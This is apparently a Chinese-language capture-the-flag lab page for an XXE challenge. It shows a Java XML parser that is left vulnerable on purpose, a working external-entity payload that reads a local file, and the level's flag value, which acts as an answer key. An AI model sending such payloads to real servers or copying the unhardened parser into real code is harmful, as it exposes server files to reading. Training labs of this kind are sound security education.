# Level 1 — 有回显XXE文件读取

## 关卡说明

本关模拟XML配置解析功能，后端使用 `DocumentBuilderFactory` 解析XML且未禁用外部实体。攻击者可以通过定义外部实体读取服务器上的虚拟Flag文件。

**目标**：构造包含外部实体的XML Payload，读取虚拟文件 `/flag/xxe-level1`，获取当前关卡的 Flag。

## 漏洞原理

### 代码逻辑分析

```
POST /api/challenge/xxe/level1/parse
Content-Type: application/xml
```

**漏洞点**：

```java
// 【漏洞核心】不禁用外部实体解析
DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();
// 故意不设置安全特性，允许 XXE
DocumentBuilder builder = factory.newDocumentBuilder();
```

**虚拟文件**：`/flag/xxe-level1` → 内容为 `XXE_LEVEL1_SECRET_TOKEN_2024`

## 通关步骤

### Step 1：提交正常XML

```xml
<?xml version="1.0"?>
<config>
    <name>test</name>
</config>
```

### Step 2：构造XXE Payload

```xml
<?xml version="1.0"?>
<!DOCTYPE config [
  <!ENTITY xxe SYSTEM "file:///flag/xxe-level1">
]>
<config>
    <name>&xxe;</name>
</config>
```

### Step 3：获取 Flag

当解析结果中包含虚拟Flag文件内容时，响应中包含 Flag。

## 涉及文件

| 文件 | 说明 |
|------|------|
| `controller/challenge/xxe/XxeLevel1Controller.java` | 后端XML解析接口 |
| `service/FlagService.java` | Flag 获取与验证 |
